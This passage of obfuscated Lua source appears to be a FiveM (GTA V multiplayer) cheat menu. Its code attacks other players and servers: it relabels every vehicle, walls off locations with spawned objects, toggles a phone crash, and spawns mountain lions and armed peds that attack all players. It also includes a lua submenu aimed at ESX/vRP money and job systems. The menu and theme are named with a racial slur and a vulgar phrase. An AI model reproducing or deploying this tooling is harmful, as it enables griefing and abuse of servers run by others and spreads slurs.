			veh = CreateVehicle(GetHashKey(fn), bs.x + fq * 20, bs.y + fr * 20, bs.z + 500, a2, 1, 1)
		else
			veh = CreateVehicle(GetHashKey(fn), bs.x + fq * 5, bs.y + fr * 5, bs.z, a2, 1, 1)
		end;
		if fo then
			SetPedIntoVehicle(PlayerPedId(), veh, -1)
		end
	else
		ShowInfo("~r~Model not recognized (Try Again)")
	end
end;
local function fu(by)
	local ped = GetPlayerPed(by)
	outfit = {}
	outfit.hat = GetPedPropIndex(ped, 0)
	outfit.hat_texture = GetPedPropTextureIndex(ped, 0)
	outfit.glasses = GetPedPropIndex(ped, 1)
	outfit.glasses_texture = GetPedPropTextureIndex(ped, 1)
	outfit.ear = GetPedPropIndex(ped, 2)
	outfit.ear_texture = GetPedPropTextureIndex(ped, 2)
	outfit.watch = GetPedPropIndex(ped, 6)
	outfit.watch_texture = GetPedPropTextureIndex(ped, 6)
	outfit.wrist = GetPedPropIndex(ped, 7)
	outfit.wrist_texture = GetPedPropTextureIndex(ped, 7)
	outfit.head_drawable = GetPedDrawableVariation(ped, 0)
	outfit.head_palette = GetPedPaletteVariation(ped, 0)
	outfit.head_texture = GetPedTextureVariation(ped, 0)
	outfit.beard_drawable = GetPedDrawableVariation(ped, 1)
	outfit.beard_palette = GetPedPaletteVariation(ped, 1)
	outfit.beard_texture = GetPedTextureVariation(ped, 1)
	outfit.hair_drawable = GetPedDrawableVariation(ped, 2)
	outfit.hair_palette = GetPedPaletteVariation(ped, 2)
	outfit.hair_texture = GetPedTextureVariation(ped, 2)
	outfit.torso_drawable = GetPedDrawableVariation(ped, 3)
	outfit.torso_palette = GetPedPaletteVariation(ped, 3)
	outfit.torso_texture = GetPedTextureVariation(ped, 3)
	outfit.legs_drawable = GetPedDrawableVariation(ped, 4)
	outfit.legs_palette = GetPedPaletteVariation(ped, 4)
	outfit.legs_texture = GetPedTextureVariation(ped, 4)
	outfit.hands_drawable = GetPedDrawableVariation(ped, 5)
	outfit.hands_palette = GetPedPaletteVariation(ped, 5)
	outfit.hands_texture = GetPedTextureVariation(ped, 5)
	outfit.foot_drawable = GetPedDrawableVariation(ped, 6)
	outfit.foot_palette = GetPedPaletteVariation(ped, 6)
	outfit.foot_texture = GetPedTextureVariation(ped, 6)
	outfit.acc1_drawable = GetPedDrawableVariation(ped, 7)
	outfit.acc1_palette = GetPedPaletteVariation(ped, 7)
	outfit.acc1_texture = GetPedTextureVariation(ped, 7)
	outfit.acc2_drawable = GetPedDrawableVariation(ped, 8)
	outfit.acc2_palette = GetPedPaletteVariation(ped, 8)
	outfit.acc2_texture = GetPedTextureVariation(ped, 8)
	outfit.acc3_drawable = GetPedDrawableVariation(ped, 9)
	outfit.acc3_palette = GetPedPaletteVariation(ped, 9)
	outfit.acc3_texture = GetPedTextureVariation(ped, 9)
	outfit.mask_drawable = GetPedDrawableVariation(ped, 10)
	outfit.mask_palette = GetPedPaletteVariation(ped, 10)
	outfit.mask_texture = GetPedTextureVariation(ped, 10)
	outfit.aux_drawable = GetPedDrawableVariation(ped, 11)
	outfit.aux_palette = GetPedPaletteVariation(ped, 11)
	outfit.aux_texture = GetPedTextureVariation(ped, 11)
	return outfit
end;
local function fv(outfit)
	local ped = PlayerPedId()
	SetPedPropIndex(ped, 0, outfit.hat, outfit.hat_texture, 1)
	SetPedPropIndex(ped, 1, outfit.glasses, outfit.glasses_texture, 1)
	SetPedPropIndex(ped, 2, outfit.ear, outfit.ear_texture, 1)
	SetPedPropIndex(ped, 6, outfit.watch, outfit.watch_texture, 1)
	SetPedPropIndex(ped, 7, outfit.wrist, outfit.wrist_texture, 1)
	SetPedComponentVariation(ped, 0, outfit.head_drawable, outfit.head_texture, outfit.head_palette)
	SetPedComponentVariation(ped, 1, outfit.beard_drawable, outfit.beard_texture, outfit.beard_palette)
	SetPedComponentVariation(ped, 2, outfit.hair_drawable, outfit.hair_texture, outfit.hair_palette)
	SetPedComponentVariation(ped, 3, outfit.torso_drawable, outfit.torso_texture, outfit.torso_palette)
	SetPedComponentVariation(ped, 4, outfit.legs_drawable, outfit.legs_texture, outfit.legs_palette)
	SetPedComponentVariation(ped, 5, outfit.hands_drawable, outfit.hands_texture, outfit.hands_palette)
	SetPedComponentVariation(ped, 6, outfit.foot_drawable, outfit.foot_texture, outfit.foot_palette)
	SetPedComponentVariation(ped, 7, outfit.acc1_drawable, outfit.acc1_texture, outfit.acc1_palette)
	SetPedComponentVariation(ped, 8, outfit.acc2_drawable, outfit.acc2_texture, outfit.acc2_palette)
	SetPedComponentVariation(ped, 9, outfit.acc3_drawable, outfit.acc3_texture, outfit.acc3_palette)
	SetPedComponentVariation(ped, 10, outfit.mask_drawable, outfit.mask_texture, outfit.mask_palette)
	SetPedComponentVariation(ped, 11, outfit.aux_drawable, outfit.aux_texture, outfit.aux_palette)
end;
local function fw()
	local fx = {}
	for i = 1, GetNumResources() do
		fx[i] = GetResourceByFindIndex(i)
	end;
	return fx
end;
function IsResourceInstalled(aM)
	local fx = fw()
	for i = 1, #fx do
		if fx[i] == aM then
			return true
		else
			return false
		end
	end
end;
function IhadSexWithMyStepMother.SetFont(u, M)
	m = M;
	a[u].titleFont = M
end;
function IhadSexWithMyStepMother.SetMenuFocusBackgroundColor(u, aI, aJ, aK, aL)
	E(u, "menuFocusBackgroundColor", {
		["r"] = aI,
		["g"] = aJ,
		["b"] = aK,
		["a"] = aL or a[u].menuFocusBackgroundColor.a
	})
end;
function IhadSexWithMyStepMother.SetMaxOptionCount(u, aH)
	E(u, "maxOptionCount", aH)
end;
function IhadSexWithMyStepMother.PopupWindow(x, y, as)
end;
function IhadSexWithMyStepMother.SetTheme(u, theme)
	if theme == "StupidNiggaPaster" then
		IhadSexWithMyStepMother.SetMenuBackgroundColor(u, 6, 6, 6, 150)
		IhadSexWithMyStepMother.SetTitleBackgroundColor(u, 19, 22, 59, 0)
		IhadSexWithMyStepMother.SetTitleColor(u, 200, 200, 200, 200)
		IhadSexWithMyStepMother.SetMenuSubTextColor(u, 242, 243, 249, 255)
		IhadSexWithMyStepMother.SetMenuFocusBackgroundColor(u, 19, 22, 59, 170)
		IhadSexWithMyStepMother.SetFont(u, 0)
		IhadSexWithMyStepMother.SetMenuX(u, .75)
		IhadSexWithMyStepMother.SetMenuY(u, .1)
		IhadSexWithMyStepMother.SetMenuWidth(u, 0.222)
		IhadSexWithMyStepMother.SetMaxOptionCount(u, 15)
		f = 0.11;
		g = 0.5;
		j = 0.03;
		h = 2;
		l = 0.038;
		n = 0.365;
		o = 0.005;
		p = 0.005;
		themecolor = "~v~"
		themearrow = " ~w~»"
	end
end;
function IhadSexWithMyStepMother.InitializeTheme()
	for i = 1, #menulist do
		IhadSexWithMyStepMother.SetTheme(menulist[i], theme)
	end
end;
function IhadSexWithMyStepMother.ComboBox2(r, aC, aD, aE, aB)
	local aF = #aC;
	local aG = aC[aD]
	local ax = a[e].currentOption == c + 1;
	if aF > 1 and ax then
		aG = tostring(aG)
	end;
	if IhadSexWithMyStepMother.Button(r, aG) then
		aE = aD;
		aB(aD, aE)
		return true
	elseif ax then
		if d == b.left then
			if aD > 1 then
				aD = aD - 1
			elseif aD == 1 then
				aD = 1
			end
		elseif d == b.right then
			if aD < aF then
				aD = aD + 1
			elseif aD == aF then
				aD = aF
			end
		end
	else
		aD = aE
	end;
	aB(aD, aE)
	return false
end;
function IhadSexWithMyStepMother.ComboBoxSlider(r, aC, aD, aE, aB)
	local aF = #aC;
	local aG = aC[aD]
	local ax = a[e].currentOption == c + 1;
	if aF > 1 and ax then
		aG = tostring(aG)
	end;
	if IhadSexWithMyStepMother.Button2(r, aC, aF, aD) then
		aE = aD;
		aB(aD, aE)
		return true
	elseif ax then
		if d == b.left then
			if aD > 1 then
				aD = aD - 1
			elseif aD == 1 then
				aD = 1
			end
		elseif d == b.right then
			if aD < aF then
				aD = aD + 1
			elseif aD == aF then
				aD = aF
			end
		end
	else
		aD = aE
	end;
	aB(aD, aE)
	return false
end;
local function fy(r, aC, aF, aD)
	local x = a[e].x + a[e].width / 2;
	local ao = nil;
	if a[e].currentOption <= a[e].maxOptionCount and c <= a[e].maxOptionCount then
		ao = c
	elseif c > a[e].currentOption - a[e].maxOptionCount and c <= a[e].currentOption then
		ao = c - (a[e].currentOption - a[e].maxOptionCount)
	end;
	if ao then
		local y = a[e].y + f + l + l * ao - l / 2;
		local ap = nil;
		local aq = nil;
		local ar = nil;
		local Q = false;
		if a[e].currentOption == c then
			ap = a[e].menuFocusBackgroundColor;
			aq = a[e].menuFocusTextColor;
			ar = a[e].menuFocusTextColor
		else
			ap = a[e].menuBackgroundColor;
			aq = a[e].menuTextColor;
			ar = a[e].menuSubTextColor;
			Q = true
		end;
		local ag = a[e].width / 3 / aF;
		local fz = (ag * (aD + 1) - ag * aD) / 2;
		local fA = 0.1;
		local fB = 1;
		if aF >= 40 then
			fB = 1.005
		end;
		S(x, y, a[e].width, l, ap)
		S((a[e].x + 0.1075 + fz * aF) / fB, y, ag * (aF - 1), l / 2, {
			r = 110,
			g = 110,
			b = 110,
			a = 150
		})
		S((a[e].x + 0.1075 + fz * aD) / fB, y, ag * (aD - 1), l / 2, {
			r = 200,
			g = 200,
			b = 200,
			a = 140
		})
		L(r, a[e].x + o, y - l / 2 + p, m, aq, n, false, Q)
		local fC = tostring(aC[aD])
		if string.len(fC) == 1 then
			fA = 0.1050
		elseif string.len(fC) == 2 then
			fA = 0.1025
		elseif string.len(fC) == 3 then
			fA = 0.10015
		elseif string.len(fC) == 4 then
			fA = 0.1085
		elseif string.len(fC) == 5 then
			fA = 0.1070
		elseif string.len(fC) >= 6 then
			fA = 0.1055
		end;
		L(aC[aD], (a[e].x + fA + 0.04) / fB, y - l / 2.15 + p, m, {
			r = 255,
			g = 255,
			b = 255,
			a = 255
		}, n, false, Q)
	end
end;
function roundNum(num, e8)
	local a9 = 10 ^ (e8 or 0)
	return math.floor(num * a9 + 0.5) / a9
end;
function IhadSexWithMyStepMother.Button2(r, aC, aF, aD)
	local aw = r;
	if a[e] then
		c = c + 1;
		local ax = a[e].currentOption == c;
		fy(r, aC, aF, aD)
		if ax then
			if d == b.select then
				PlaySoundFrontend(-1, a[e].buttonPressedSound.name, a[e].buttonPressedSound.set, true)
				q(aw .. " button pressed")
				return true
			elseif d == b.left or d == b.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end;
		return false
	else
		q("Failed to create " .. aw .. " button: " .. tostring(e) .. " menu doesn't exist")
		return false
	end
end;
Resources = fw()
ResourcesToCheck = {
	"es_extended",
	"esx_dmvschool",
	"esx_policejob",
	"",
	"vrp",
	"vrp_trucker",
	"vrp_TruckerJob"
}
Citizen.CreateThread(function()
	if mpMessage then
		ShowMPMessage(startMessage, subMessage, 50)
	else
		ShowInfo(startMessage .. " " .. subMessage)
	end;
	if mpMessage then
		ShowMPMessage(subMessage1, 50)
	else
		ShowInfo(subMessage1)
	end;
	ShowInfo(motd3)
	local fD = 1;
	local fE = 1;
	local fF = GetPedDrawableVariation(PlayerPedId(), 0) + 1;
	local fG = GetPedDrawableVariation(PlayerPedId(), 0) + 1;
	local fH = GetPedTextureVariation(PlayerPedId(), 0) + 1;
	local fI = GetPedTextureVariation(PlayerPedId(), 0) + 1;
	local fJ = GetPedDrawableVariation(PlayerPedId(), 2) + 1;
	local fK = GetPedDrawableVariation(PlayerPedId(), 2) + 1;
	local fL = GetPedTextureVariation(PlayerPedId(), 2) + 1;
	local fM = GetPedTextureVariation(PlayerPedId(), 2) + 1;
	local fN = GetPedDrawableVariation(PlayerPedId(), 1) + 1;
	local fO = GetPedDrawableVariation(PlayerPedId(), 1) + 1;
	local fP = GetPedPropIndex(PlayerPedId(), 0) + 1;
	local fQ = GetPedPropIndex(PlayerPedId(), 0) + 1;
	if fP == 0 or fP == 1 then
		fP = 9;
		fQ = 9
	end;
	local fR = GetPedPropTextureIndex(PlayerPedId(), 0)
	local fS = GetPedPropTextureIndex(PlayerPedId(), 0)
	if fR == -1 or fR == 0 then
		fR = 1;
		fS = 1
	end;
	local fT = 1;
	local fU = 1;
	local fV = 1;
	local fW = 1;
	local fX = 1;
	local fY = 1;
	local fZ = 1;
	local f_ = 1;
	local g0 = 1;
	local g1 = 1;
	local g2 = 1;
	local g3 = 1;
	local g4 = 1;
	local g5 = 1;
	local g6 = 1;
	local g7 = 1;
	local g8 = 1;
	local g9 = 1;
	local ga = 3;
	local gb = 3;
	local gc = 1;
	local gd = 1;
	local ge = {}
	local gf = 1;
	local gg = 1;
	local gh = 3;
	local gi = 3;
	local gj = 1;
	local gk = 1;
	local gl = 1;
	local gm = 1;
	local gn = 3;
	local go = 3;
	local gp = 1;
	local gq = 1;
	local gr = 1;
	local gs = 1;
	local gt = 1;
	local gu = 1;
	local gv = 1;
	local gw = 1;
	local gx = 1;
	local gy = 1;
	local gz = 1;
	local gA = 1;
	local gB = 1;
	local gC = 1;
	local gD = 1;
	local gE = 1;
	local gF = 1;
	local gG = 1;
	local gH = nil;
	local gI = nil;
	local gJ = nil;
	local PossessingVeh = false;
	local gK = nil;
	local gL = nil;
	local gM = ""
	local gN = nil;
	if NetworkIsHost() then
		gN = "~g~Yes"
	else
		gN = "~r~No"
	end;
	local gO = nil;
	local gP = nil;
	local gQ = nil;
	local gR = nil;
	local gS = nil;
	local gT = true;
	local gU = true;
	local gV = true;
	local fo = true;
	local ft = true;
	local fp = true;
	SpawnedObjects = {}
	IhadSexWithMyStepMother.CreateMenu("StupidNiggaPaster", "")
	IhadSexWithMyStepMother.SetSubTitle("StupidNiggaPaster", "")
	IhadSexWithMyStepMother.CreateSubMenu("self", "StupidNiggaPaster", "")
	IhadSexWithMyStepMother.CreateSubMenu("player", "StupidNiggaPaster", "")
	IhadSexWithMyStepMother.CreateSubMenu("weapon", "StupidNiggaPaster", "")
	IhadSexWithMyStepMother.CreateSubMenu("vehicle", "StupidNiggaPaster", "")
	IhadSexWithMyStepMother.CreateSubMenu("world", "StupidNiggaPaster", "")
	IhadSexWithMyStepMother.CreateSubMenu("teleport", "StupidNiggaPaster", "")
	IhadSexWithMyStepMother.CreateSubMenu("misc", "StupidNiggaPaster", "")
	IhadSexWithMyStepMother.CreateSubMenu("lua", "StupidNiggaPaster", "")
	IhadSexWithMyStepMother.CreateSubMenu("settingslol", "StupidNiggaPaster", "")
	IhadSexWithMyStepMother.CreateSubMenu("allplayer", "player", " ")
	IhadSexWithMyStepMother.CreateSubMenu("playeroptions", "player", " ")
	IhadSexWithMyStepMother.CreateSubMenu("troll", "playeroptions", " ")
	IhadSexWithMyStepMother.CreateSubMenu("crashtroll", "playeroptions", "  ")
	IhadSexWithMyStepMother.CreateSubMenu("weaponspawnerplayer", "playeroptions", " ")
	IhadSexWithMyStepMother.CreateSubMenu("appearance", "self", " ")
	IhadSexWithMyStepMother.CreateSubMenu("modifiers", "self", " ")
	IhadSexWithMyStepMother.CreateSubMenu("modifyskintextures", "appearance", "")
	IhadSexWithMyStepMother.CreateSubMenu("modifyhead", "modifyskintextures", " ")
	IhadSexWithMyStepMother.CreateSubMenu("skinsmodels", "appearance", "")
	IhadSexWithMyStepMother.CreateSubMenu("WeaponCustomization", "weapon", " ")
	IhadSexWithMyStepMother.CreateSubMenu("weaponspawner", "weapon", " ")
	IhadSexWithMyStepMother.CreateSubMenu("melee", "weaponspawner", " ")
	IhadSexWithMyStepMother.CreateSubMenu("pistol", "weaponspawner", "")
	IhadSexWithMyStepMother.CreateSubMenu("smg", "weaponspawner", "")
	IhadSexWithMyStepMother.CreateSubMenu("shotgun", "weaponspawner", "")
	IhadSexWithMyStepMother.CreateSubMenu("assault", "weaponspawner", " ")
	IhadSexWithMyStepMother.CreateSubMenu("sniper", "weaponspawner", " ")
	IhadSexWithMyStepMother.CreateSubMenu("thrown", "weaponspawner", " ")
	IhadSexWithMyStepMother.CreateSubMenu("heavy", "weaponspawner", " ")
	IhadSexWithMyStepMother.CreateSubMenu("vehiclespawner", "vehicle", " ")
	IhadSexWithMyStepMother.CreateSubMenu("vehiclemods", "vehicle", " ")
	IhadSexWithMyStepMother.CreateSubMenu("vehiclemenu", "vehicle", "  ")
	IhadSexWithMyStepMother.CreateSubMenu("VehBoostMenu", "vehicle", "  ")
	IhadSexWithMyStepMother.CreateSubMenu("compacts", "vehiclespawner", "")
	IhadSexWithMyStepMother.CreateSubMenu("sedans", "vehiclespawner", "")
	IhadSexWithMyStepMother.CreateSubMenu("suvs", "vehiclespawner", "")
	IhadSexWithMyStepMother.CreateSubMenu("coupes", "vehiclespawner", "")
	IhadSexWithMyStepMother.CreateSubMenu("muscle", "vehiclespawner", "")
	IhadSexWithMyStepMother.CreateSubMenu("sportsclassics", "vehiclespawner", " ")
	IhadSexWithMyStepMother.CreateSubMenu("sports", "vehiclespawner", "")
	IhadSexWithMyStepMother.CreateSubMenu("super", "vehiclespawner", "")
	IhadSexWithMyStepMother.CreateSubMenu("AmX", "vehiclespawner", "")
	IhadSexWithMyStepMother.CreateSubMenu("offroad", "vehiclespawner", "")
	IhadSexWithMyStepMother.CreateSubMenu("industrial", "vehiclespawner", "")
	IhadSexWithMyStepMother.CreateSubMenu("utility", "vehiclespawner", "")
	IhadSexWithMyStepMother.CreateSubMenu("vans", "vehiclespawner", "")
	IhadSexWithMyStepMother.CreateSubMenu("cycles", "vehiclespawner", "")
	IhadSexWithMyStepMother.CreateSubMenu("boats", "vehiclespawner", "")
	IhadSexWithMyStepMother.CreateSubMenu("helicopters", "vehiclespawner", "")
	IhadSexWithMyStepMother.CreateSubMenu("planes", "vehiclespawner", "")
	IhadSexWithMyStepMother.CreateSubMenu("service", "vehiclespawner", "")
	IhadSexWithMyStepMother.CreateSubMenu("commercial", "vehiclespawner", "")
	IhadSexWithMyStepMother.CreateSubMenu("vehiclecolors", "vehiclemods", " ")
	IhadSexWithMyStepMother.CreateSubMenu("vehiclecolors_primary", "vehiclecolors", " ")
	IhadSexWithMyStepMother.CreateSubMenu("vehiclecolors_secondary", "vehiclecolors", " ")
	IhadSexWithMyStepMother.CreateSubMenu("primary_classic", "vehiclecolors_primary", " ")
	IhadSexWithMyStepMother.CreateSubMenu("primary_matte", "vehiclecolors_primary", " ")
	IhadSexWithMyStepMother.CreateSubMenu("primary_metal", "vehiclecolors_primary", "")
	IhadSexWithMyStepMother.CreateSubMenu("secondary_classic", "vehiclecolors_secondary", " ")
	IhadSexWithMyStepMother.CreateSubMenu("secondary_matte", "vehiclecolors_secondary", " ")
	IhadSexWithMyStepMother.CreateSubMenu("secondary_metal", "vehiclecolors_secondary", "")
	IhadSexWithMyStepMother.CreateSubMenu("vehicletuning", "vehiclemods", " ")
	IhadSexWithMyStepMother.CreateSubMenu("objectspawner", "StupidNiggaPaster", " ")
	IhadSexWithMyStepMother.CreateSubMenu("objectlist", "objectspawner", "")
	IhadSexWithMyStepMother.CreateSubMenu("weather", "world", "")
	IhadSexWithMyStepMother.CreateSubMenu("time", "world", " ")
	IhadSexWithMyStepMother.CreateSubMenu("esp", "misc", "")
	IhadSexWithMyStepMother.CreateSubMenu("webradio", "misc", "")
	IhadSexWithMyStepMother.CreateSubMenu("credits", "settingslol", "")
	IhadSexWithMyStepMother.CreateSubMenu("saveload", "teleport", "")
	IhadSexWithMyStepMother.CreateSubMenu("pois", "teleport", "")
	IhadSexWithMyStepMother.CreateSubMenu("fuckserver", "StupidNiggaPaster", "")
	IhadSexWithMyStepMother.CreateSubMenu("esx", "lua", " ")
	IhadSexWithMyStepMother.CreateSubMenu("vrp", "lua", " ")
	IhadSexWithMyStepMother.CreateSubMenu("player1", "lua", " ")
	IhadSexWithMyStepMother.CreateSubMenu("other", "player1", " ")
	IhadSexWithMyStepMother.CreateSubMenu("money", "lua", " ")
	IhadSexWithMyStepMother.CreateSubMenu("drogas", "lua", " ")
	IhadSexWithMyStepMother.CreateSubMenu("mecanico", "lua", " ")
	IhadSexWithMyStepMother.InitializeTheme()
	while true do
		if IhadSexWithMyStepMother.IsMenuOpened("StupidNiggaPaster") then
			if IhadSexWithMyStepMother.MenuButton("ﻲﺘﻤﺋﺎﻗ ", "self") then
			elseif IhadSexWithMyStepMother.MenuButton("ﻦﻴﺒﻋﻻﺍ ﺔﻤﺋﺎﻗ ", "player") then
			elseif IhadSexWithMyStepMother.MenuButton("ﺭﺩﺍﺮﻟﺍ ﺔﻤﺋﺎﻗ ", "misc") then
			elseif IhadSexWithMyStepMother.MenuButton("ﺔﻠﺤﺳﻷﺍ ﺔﻤﺋﺎﻗ ", "weapon") then
			elseif IhadSexWithMyStepMother.MenuButton("ﺕﺍﺭﺎﻴﺴﻟﺍ ﺔﻤﺋﺎﻗ ", "vehicle") then
			elseif IhadSexWithMyStepMother.MenuButton("ﻮﺠﻟﺍ ﺔﻤﺋﺎﻗ ", "world") then
			elseif IhadSexWithMyStepMother.MenuButton("ﻝﺎﻘﺘﻧﻷﺍ ﺔﻤﺋﺎﻗ ", "teleport") then
			elseif IhadSexWithMyStepMother.MenuButton("ﺕﺎﺘﻜﺠﺑﻭﻷﺍ ﺔﻤﺋﺎﻗ ", "objectspawner") then
			elseif IhadSexWithMyStepMother.MenuButton("ﺐﻳﺮﺨﺘﻟﺍ ﺔﻤﺋﺎﻗ ", "fuckserver") then
			elseif IhadSexWithMyStepMother.MenuButton("ﺕﺍﺮﻐﺜﻟﺍ ﺔﻤﺋﺎﻗ ", "lua") then
			elseif IhadSexWithMyStepMother.MenuButton("ﺕﺍﺩﺍﺪﻋﻷﺍ ", "settingslol") then
			elseif IhadSexWithMyStepMother.Button("ﻮﻴﻨﻤﻟﺍ ﻕﻼﻏﺍ") then
				break
			end;
			ShowInfo(motd2)
			ShowInfo(motd)
			ShowInfo(motd5)
		elseif IhadSexWithMyStepMother.IsMenuOpened("player") then
			local gW = GetActivePlayers()
			for i = 1, #gW do
				local gX = gW[i]
				if IhadSexWithMyStepMother.MenuButton("~r~[" .. GetPlayerServerId(gX) .. "] ~s~" .. GetPlayerName(gX) .. " " .. (IsPedDeadOrDying(GetPlayerPed(gX), 1) and "~s~[~r~DEAD~s~]" or "~s~[~g~ALIVE~s~]"), "playeroptions") then
					selectedPlayer = gX
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("fuckserver") then
			if IhadSexWithMyStepMother.CheckBox("ﻚﺴﻔﻧ ﻞﻤﺸﺗ", gT, "No", "Yes") then
				gT = not gT
			elseif IhadSexWithMyStepMother.Button("ﺓﺭﺎﻴﺴﻟﺍ ﻦﻣ ﻞﻜﻟﺍ ﺩﺮﻃ") then
				eT(gT)
			elseif IhadSexWithMyStepMother.CheckBox("ﺕﺍﺭﺎﻴﺳ ﻦﺒﺳﺮﺗ", nukeserver) then
				ShowInfo("~y~ِAmX on top..")
				nukeserver = not nukeserver
			elseif IhadSexWithMyStepMother.Button("ﺱﺎﻧ ﺏﺮﻗﺍ ﺔﺣﻮﻟ ﺮﻴﻐﺗ") then
				local gY = e9("Enter Plate Text (8 Characters):")
				for cP in EnumerateVehicles() do
					RequestControlOnce(cP)
					SetVehicleNumberPlateText(cP, gY)
				end
			elseif IhadSexWithMyStepMother.CheckBox("ﺕﺍﺭﺎﻴﺴﻟﺍ ﺮﻴﻄﺗ", FlyingCars) then
				FlyingCars = not FlyingCars
			elseif IhadSexWithMyStepMother.CheckBox("%04 cfw ﺵﺍﺮﻛ", Enable_GcPhone) then
				Enable_GcPhone = not Enable_GcPhone
			elseif IhadSexWithMyStepMother.Button("ﺔﻴﻜﻠﻤﻟﺍ ﻝﻮﺣ ﻦﺒﺳﺮﺗ") then
				x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
				roundx = tonumber(string.format("%.2f", x))
				roundy = tonumber(string.format("%.2f", y))
				roundz = tonumber(string.format("%.2f", z))
				local gZ = -145066854;
				RequestModel(gZ)
				while not HasModelLoaded(gZ) do
					Citizen.Wait(0)
				end;
				local g_ = CreateObject(gZ, -50.97, -1066.92, 26.52, true, true, false)
				local h0 = CreateObject(gZ, -63.86, -1099.05, 25.26, true, true, false)
				local h1 = CreateObject(gZ, -44.13, -1129.49, 25.07, true, true, false)
				SetEntityHeading(g_, 160.59)
				SetEntityHeading(h0, 216.98)
				SetEntityHeading(h1, 291.74)
				FreezeEntityPosition(g_, true)
				FreezeEntityPosition(h0, true)
				FreezeEntityPosition(h1, true)
			elseif IhadSexWithMyStepMother.Button("ﺰﻛﺮﻤﻟﺍ ﻝﻮﺣ ﻦﺒﺳﺮﺗ") then
				x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
				roundx = tonumber(string.format("%.2f", x))
				roundy = tonumber(string.format("%.2f", y))
				roundz = tonumber(string.format("%.2f", z))
				local gZ = -145066854;
				RequestModel(gZ)
				while not HasModelLoaded(gZ) do
					Citizen.Wait(0)
				end;
				local h2 = CreateObject(gZ, 439.43, -965.49, 27.05, true, true, false)
				local h3 = CreateObject(gZ, 401.04, -1015.15, 27.42, true, true, false)
				local h4 = CreateObject(gZ, 490.22, -1027.29, 26.18, true, true, false)
				local h5 = CreateObject(gZ, 491.36, -925.55, 24.48, true, true, false)
				SetEntityHeading(h2, 130.75)
				SetEntityHeading(h3, 212.63)
				SetEntityHeading(h4, 340.06)
				SetEntityHeading(h5, 209.57)
				FreezeEntityPosition(h2, true)
				FreezeEntityPosition(h3, true)
				FreezeEntityPosition(h4, true)
				FreezeEntityPosition(h5, true)
			elseif IhadSexWithMyStepMother.Button("ﺔﻴﻜﻠﻤﻟﺍ ﻝﻮﺣ ﻦﺒﺳﺮﺗ") then
				x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
				roundx = tonumber(string.format("%.2f", x))
				roundy = tonumber(string.format("%.2f", y))
				roundz = tonumber(string.format("%.2f", z))
				local gZ = -145066854;
				RequestModel(gZ)
				while not HasModelLoaded(gZ) do
					Citizen.Wait(0)
				end;
				local h6 = CreateObject(gZ, 97.8, -993.22, 28.41, true, true, false)
				local h7 = CreateObject(gZ, 247.08, -1027.62, 28.26, true, true, false)
				local h8 = CreateObject(gZ, 274.51, -833.73, 28.25, true, true, false)
				local h9 = CreateObject(gZ, 291.54, -939.83, 27.41, true, true, false)
				local ha = CreateObject(gZ, 143.88, -830.49, 30.17, true, true, false)
				local hb = CreateObject(gZ, 161.97, -768.79, 29.08, true, true, false)
				local hc = CreateObject(gZ, 151.56, -1061.72, 28.21, true, true, false)
				SetEntityHeading(h6, 39.79)
				SetEntityHeading(h7, 128.62)
				SetEntityHeading(h8, 212.1)
				SetEntityHeading(h9, 179.22)
				SetEntityHeading(ha, 292.37)
				SetEntityHeading(hb, 238.46)
				SetEntityHeading(hc, 61.43)
				FreezeEntityPosition(h6, true)
				FreezeEntityPosition(h7, true)
				FreezeEntityPosition(h8, true)
				FreezeEntityPosition(h9, true)
				FreezeEntityPosition(ha, true)
				FreezeEntityPosition(hb, true)
				FreezeEntityPosition(hc, true)
			elseif IhadSexWithMyStepMother.Button("ﻞﻜﻟﺍ ﻰﻠﻋ ﺪﺳﺍ ﻦﺒﺳﺮﺗ") then
				local hd = "A_C_MtLion"
				local ey = GetActivePlayers()
				for i = 0, #ey do
					local he = GetEntityCoords(GetPlayerPed(i))
					RequestModel(GetHashKey(hd))
					Citizen.Wait(50)
					if HasModelLoaded(GetHashKey(hd)) then
						local ped = CreatePed(21, GetHashKey(hd), he.x, he.y, he.z, 0, true, true)
						CreatePed(21, GetHashKey(hd), he.x, he.y, he.z, 0, true, true)
						CreatePed(21, GetHashKey(hd), he.x, he.y, he.z, 0, true, true)
						CreatePed(21, GetHashKey(hd), he.x, he.y, he.z, 0, true, true)
						CreatePed(21, GetHashKey(hd), he.x, he.y, he.z, 0, true, true)
						CreatePed(21, GetHashKey(hd), he.x, he.y, he.z, 0, true, true)
						CreatePed(21, GetHashKey(hd), he.x, he.y, he.z, 0, true, true)
						CreatePed(21, GetHashKey(hd), he.x, he.y, he.z, 0, true, true)
						NetworkRegisterEntityAsNetworked(ped)
						if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
							local hf = PedToNet(ped)
							NetworkSetNetworkIdDynamic(hf, false)
							SetNetworkIdCanMigrate(hf, true)
							SetNetworkIdExistsOnAllMachines(hf, true)
							Citizen.Wait(50)
							NetToPed(hf)
							TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
						elseif IsEntityDead(GetPlayerPed(i)) then
							TaskCombatHatedTargetsInArea(ped, he.x, he.y, he.z, 500)
						else
							Citizen.Wait(0)
						end
					end
				end
			elseif IhadSexWithMyStepMother.Button("ﺱﺎﻨﻟﺍ ﻰﻠﻋ ﻦﺒﺳﺮﻳ ") then
				local bM = "a_m_m_acult_01"
				local bR = "weapon_rpg"
				local ey = GetActivePlayers()
				for i = 0, #ey do
					local hg = GetEntityCoords(GetPlayerPed(i))
					RequestModel(GetHashKey(bM))
					Citizen.Wait(50)
					if HasModelLoaded(GetHashKey(bM)) then
						local ped = CreatePed(21, GetHashKey(bM), hg.x - 1, hg.y, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x + 1, hg.y, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x, hg.y - 1, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x, hg.y + 1, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x - 1, hg.y, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x + 1, hg.y, hg.z, 0, true, true)
						CreatePed(21, GetHashKey(bM), hg.x, hg.y - 1, hg.z, 0, true, true)
